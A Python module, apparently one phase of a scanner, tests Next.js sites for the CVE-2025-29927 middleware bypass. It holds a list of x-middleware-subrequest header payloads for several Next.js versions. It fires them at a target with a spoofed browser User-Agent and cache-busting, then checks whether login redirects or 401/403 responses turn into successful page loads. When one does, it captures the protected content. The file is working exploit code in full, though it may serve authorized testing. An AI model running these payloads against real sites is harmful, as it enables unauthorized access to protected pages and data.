"""
Phase 3: Test Bypass Consistency

Tests the CVE-2025-29927 bypass using the x-middleware-subrequest header
with multiple payloads and a 4-request consistency verification pattern.
"""

import logging
import time
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin

import requests
from requests.exceptions import RequestException

from .models import BaselineResult, BypassResult, DifferenceResult, Confidence
from .baseline import is_login_page


# Configure logging
logger = logging.getLogger(__name__)

# Default delay between requests (seconds)
# Can be increased for high-latency servers or CDN caching
DEFAULT_REQUEST_DELAY = 0.1
MIN_REQUEST_DELAY = 0.05
MAX_REQUEST_DELAY = 2.0

# Bypass payloads for different Next.js versions
BYPASS_PAYLOADS = [
    (
        "v15_root",
        "middleware:middleware:middleware:middleware:middleware",
        "Next.js 15.x root middleware"
    ),
    (
        "v13_src",
        "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
        "Next.js 13+ src/ middleware"
    ),
    (
        "v12_pages",
        "pages/_middleware",
        "Next.js 12.x pages middleware"
    ),
    (
        "polyglot",
        "middleware:src/middleware:pages/_middleware:middleware:src/middleware",
        "Polyglot payload for multiple versions"
    ),
    (
        "v14_nested",
        "middleware:middleware:middleware",
        "Next.js 14.x shorter chain"
    ),
]


@dataclass
class RequestResult:
    """Result of a single request."""
    with_bypass: bool
    status_code: int
    location: str
    content_length: int
    content_sample: str
    error: Optional[str] = None


def make_request(
    url: str,
    session: requests.Session,
    timeout: int,
    bypass_header: Optional[str] = None
) -> RequestResult:
    """
    Make a single request with or without bypass header.

    Args:
        url: Target URL
        session: Requests session
        timeout: Request timeout
        bypass_header: Bypass header value (None for normal request)

    Returns:
        RequestResult with response details
    """
    headers = {}
    if bypass_header:
        headers["x-middleware-subrequest"] = bypass_header

    try:
        response = session.get(
            url,
            timeout=timeout,
            allow_redirects=False,
            headers=headers,
            cookies={}  # No cookies for consistent baseline
        )

        return RequestResult(
            with_bypass=bypass_header is not None,
            status_code=response.status_code,
            location=response.headers.get("location", response.headers.get("Location", "")),
            content_length=len(response.content),
            content_sample=response.text[:5000] if response.text else ""
        )
    except RequestException as e:
        return RequestResult(
            with_bypass=bypass_header is not None,
            status_code=0,
            location="",
            content_length=0,
            content_sample="",
            error=str(e)
        )


def analyze_behavior_difference(
    baseline: BaselineResult,
    normal: RequestResult,
    bypass: RequestResult
) -> DifferenceResult:
    """
    Analyze what changed between normal and bypass request.

    Returns:
        DifferenceResult indicating if difference is significant
    """
    # Case 1: Status changed from auth to success
    if normal.status_code in [401, 403] and bypass.status_code == 200:
        return DifferenceResult(
            is_significant=True,
            type="AUTH_TO_SUCCESS",
            description=f"Status {normal.status_code} -> 200",
            normal_status=normal.status_code,
            bypass_status=bypass.status_code,
            normal_location=normal.location,
            bypass_location=bypass.location
        )

    # Case 2: Redirect destination changed
    if normal.status_code in [301, 302, 303, 307, 308]:
        if bypass.status_code in [301, 302, 303, 307, 308]:
            if normal.location != bypass.location:
                normal_is_login = is_login_page(normal.location)
                bypass_is_login = is_login_page(bypass.location)

                if normal_is_login and not bypass_is_login:
                    return DifferenceResult(
                        is_significant=True,
                        type="REDIRECT_CHANGE",
                        description=f"Redirect from login ({normal.location}) to different destination ({bypass.location})",
                        normal_status=normal.status_code,
                        bypass_status=bypass.status_code,
                        normal_location=normal.location,
                        bypass_location=bypass.location
                    )

    # Case 3: Redirect removed (bypass returns 200)
    if normal.status_code in [301, 302, 303, 307, 308] and bypass.status_code == 200:
        return DifferenceResult(
            is_significant=True,
            type="REDIRECT_REMOVED",
            description=f"Redirect {normal.status_code} -> Direct 200",
            normal_status=normal.status_code,
            bypass_status=bypass.status_code,
            normal_location=normal.location,
            bypass_location=bypass.location
        )

    # Case 4: Auth status removed
    if normal.status_code in [401, 403] and bypass.status_code in [200, 201, 204, 206]:
        return DifferenceResult(
            is_significant=True,
            type="AUTH_REMOVED",
            description=f"Auth {normal.status_code} -> Success {bypass.status_code}",
            normal_status=normal.status_code,
            bypass_status=bypass.status_code,
            normal_location=normal.location,
            bypass_location=bypass.location
        )

    # Case 5: Content length significantly different (potential content access)
    if abs(normal.content_length - bypass.content_length) > 1000:
        # Only significant if bypass has MORE content
        if bypass.content_length > normal.content_length:
            return DifferenceResult(
                is_significant=True,
                type="CONTENT_DIFF",
                description=f"Content length {normal.content_length} -> {bypass.content_length} (+{bypass.content_length - normal.content_length})",
                normal_status=normal.status_code,
                bypass_status=bypass.status_code,
                normal_location=normal.location,
                bypass_location=bypass.location
            )

    # No significant difference
    return DifferenceResult(
        is_significant=False,
        type="NO_CHANGE",
        description="No significant behavior change detected",
        normal_status=normal.status_code,
        bypass_status=bypass.status_code,
        normal_location=normal.location,
        bypass_location=bypass.location
    )


def check_consistency(results: List[RequestResult]) -> Tuple[bool, str]:
    """
    Check if normal and bypass results are internally consistent.

    Uses the 4-request pattern: Normal -> Bypass -> Normal -> Bypass
    All normal requests should behave the same, all bypass requests should behave the same.

    Returns:
        Tuple of (is_consistent, details)
    """
    normal_results = [r for r in results if not r.with_bypass]
    bypass_results = [r for r in results if r.with_bypass]

    if len(normal_results) < 2 or len(bypass_results) < 2:
        return False, "Insufficient results for consistency check"

    # Check normal consistency
    normal_consistent = all(
        r.status_code == normal_results[0].status_code and
        r.location == normal_results[0].location
        for r in normal_results
    )

    # Check bypass consistency
    bypass_consistent = all(
        r.status_code == bypass_results[0].status_code and
        r.location == bypass_results[0].location
        for r in bypass_results
    )

    if normal_consistent and bypass_consistent:
        return True, f"{len(results)}/{len(results)} requests consistent"

    details = []
    if not normal_consistent:
        statuses = [r.status_code for r in normal_results]
        details.append(f"Normal requests inconsistent: statuses={statuses}")
    if not bypass_consistent:
        statuses = [r.status_code for r in bypass_results]
        details.append(f"Bypass requests inconsistent: statuses={statuses}")

    return False, "; ".join(details)


def test_bypass_payload(
    url: str,
    payload_name: str,
    payload_value: str,
    baseline: BaselineResult,
    session: requests.Session,
    timeout: int,
    delay: float = DEFAULT_REQUEST_DELAY
) -> Tuple[bool, Optional[DifferenceResult], bool, str, List[RequestResult]]:
    """
    Test a single bypass payload with 4-request consistency check.

    Pattern: Normal -> Bypass -> Normal -> Bypass

    Args:
        url: Target URL to test
        payload_name: Name of the payload being tested
        payload_value: The x-middleware-subrequest header value
        baseline: Baseline result from Phase 2
        session: Requests session to use
        timeout: Request timeout in seconds
        delay: Delay between requests (default: 0.1s, range: 0.05-2.0s)

    Returns:
        Tuple of (works, difference, consistent, details, results)
    """
    # Validate and clamp delay to safe range
    delay = max(MIN_REQUEST_DELAY, min(delay, MAX_REQUEST_DELAY))

    results: List[RequestResult] = []

    # 4-request consistency test
    for i in range(4):
        use_bypass = (i % 2 == 1)  # Alternate: normal, bypass, normal, bypass

        result = make_request(
            url,
            session,
            timeout,
            bypass_header=payload_value if use_bypass else None
        )
        results.append(result)

        # Delay between requests to avoid rate limiting and cache issues
        if i < 3:
            time.sleep(delay)

    # Check for errors
    errors = [r for r in results if r.error]
    if errors:
        return False, None, False, f"Request errors: {errors[0].error}", results

    # Check consistency
    consistent, consistency_details = check_consistency(results)

    if not consistent:
        return False, None, False, consistency_details, results

    # Get representative results
    normal_results = [r for r in results if not r.with_bypass]
    bypass_results = [r for r in results if r.with_bypass]

    normal_rep = normal_results[0]
    bypass_rep = bypass_results[0]

    # Check if behavior differs
    if (normal_rep.status_code == bypass_rep.status_code and
            normal_rep.location == bypass_rep.location):
        return False, None, True, "No behavior difference", results

    # Analyze the difference
    difference = analyze_behavior_difference(baseline, normal_rep, bypass_rep)

    return difference.is_significant, difference, True, consistency_details, results


def test_bypass(
    base_url: str,
    route: str,
    baseline: BaselineResult,
    session: Optional[requests.Session] = None,
    timeout: int = 10,
    payloads: Optional[List[Tuple[str, str, str]]] = None,
    delay: float = DEFAULT_REQUEST_DELAY
) -> BypassResult:
    """
    Phase 3: Test bypass with all payloads.

    Args:
        base_url: Target base URL
        route: Route to test
        baseline: Baseline result from Phase 2
        session: Optional requests session
        timeout: Request timeout
        payloads: Optional custom payloads list
        delay: Delay between requests (default: 0.1s)

    Returns:
        BypassResult with working payload and evidence
    """
    if session is None:
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        })

    if payloads is None:
        payloads = BYPASS_PAYLOADS

    url = urljoin(base_url, route)
    all_payloads_tested = []
    last_error: Optional[str] = None

    for payload_name, payload_value, description in payloads:
        all_payloads_tested.append(payload_name)

        try:
            works, difference, consistent, details, results = test_bypass_payload(
                url=url,
                payload_name=payload_name,
                payload_value=payload_value,
                baseline=baseline,
                session=session,
                timeout=timeout,
                delay=delay
            )

            if works and difference:
                # Get bypass result details
                bypass_results = [r for r in results if r.with_bypass]
                bypass_rep = bypass_results[0] if bypass_results else None

                logger.info(f"Bypass successful with payload: {payload_name}")
                return BypassResult(
                    works=True,
                    payload_name=payload_name,
                    payload_value=payload_value,
                    difference=difference,
                    consistency_verified=consistent,
                    consistency_details=details,
                    all_payloads_tested=all_payloads_tested,
                    bypass_status=bypass_rep.status_code if bypass_rep else 0,
                    bypass_location=bypass_rep.location if bypass_rep else None,
                    bypass_content_length=bypass_rep.content_length if bypass_rep else 0,
                    bypass_content_sample=bypass_rep.content_sample if bypass_rep else ""
                )

        except RequestException as e:
            # Log network errors but continue to next payload
            logger.warning(f"Request error testing payload {payload_name}: {e}")
            last_error = f"Request error: {type(e).__name__}"
            continue

        except Exception as e:
            # Log unexpected errors for debugging
            logger.error(f"Unexpected error testing payload {payload_name}: {e}", exc_info=True)
            last_error = f"Error: {type(e).__name__}"
            continue

    # No working payload found
    consistency_msg = "No working payload found"
    if last_error:
        consistency_msg += f" (last error: {last_error})"

    return BypassResult(
        works=False,
        all_payloads_tested=all_payloads_tested,
        consistency_details=consistency_msg
    )


def test_bypass_with_cache_busting(
    base_url: str,
    route: str,
    baseline: BaselineResult,
    session: Optional[requests.Session] = None,
    timeout: int = 10,
    delay: float = DEFAULT_REQUEST_DELAY
) -> BypassResult:
    """
    Test bypass with cache-busting query parameters.

    Adds unique query params to avoid CDN cache interference.

    Args:
        base_url: Target base URL
        route: Route to test
        baseline: Baseline result from Phase 2
        session: Optional requests session
        timeout: Request timeout
        delay: Delay between requests

    Returns:
        BypassResult with working payload and evidence
    """
    import uuid

    if session is None:
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache"
        })

    # Add cache-busting param
    cache_bust = str(uuid.uuid4())[:8]
    if "?" in route:
        route_with_bust = f"{route}&_cb={cache_bust}"
    else:
        route_with_bust = f"{route}?_cb={cache_bust}"

    return test_bypass(base_url, route_with_bust, baseline, session, timeout, delay=delay)
